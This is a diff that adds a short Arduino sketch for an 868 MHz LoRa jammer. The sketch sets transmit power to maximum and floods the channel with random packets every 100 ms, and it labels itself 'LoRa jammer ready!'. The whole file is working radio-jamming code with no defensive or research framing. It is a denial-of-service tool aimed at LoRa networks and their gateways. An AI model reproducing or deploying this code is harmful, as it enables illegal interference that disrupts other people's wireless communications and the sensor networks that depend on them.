@@ -1,0 +1,37 @@
+#include <LoRa.h>
+
+void setup() {
+    Serial.begin(9600);
+    while (!Serial);
+
+    // Initialize LoRa
+    if (!LoRa.begin(868E6)) {  // Use the same frequency as the sender and gateway
+        Serial.println("LoRa init failed!");
+        while (1);
+    }
+    LoRa.setTxPower(20);  // Set transmission power to maximum
+    LoRa.setSpreadingFactor(7);  // Use the lowest spreading factor for faster transmission
+    Serial.println("LoRa jammer ready!");
+}
+
+void loop() {
+    // Generate a random packet
+    String randomPacket = generateRandomPacket();
+
+    // Send the random packet
+    LoRa.beginPacket();
+    LoRa.print(randomPacket);
+    LoRa.endPacket();
+
+    Serial.println("Jamming packet sent: " + randomPacket);
+    delay(100);  // Minimal delay to flood the channel as fast as possible
+}
+
+String generateRandomPacket() {
+    String packet = "";
+    for (int i = 0; i < 16; i++) {  // Generate a 16-character random packet
+        char randomChar = 'A' + random(26);  // Random uppercase letter
+        packet += randomChar;
+    }
+    return packet;
+}
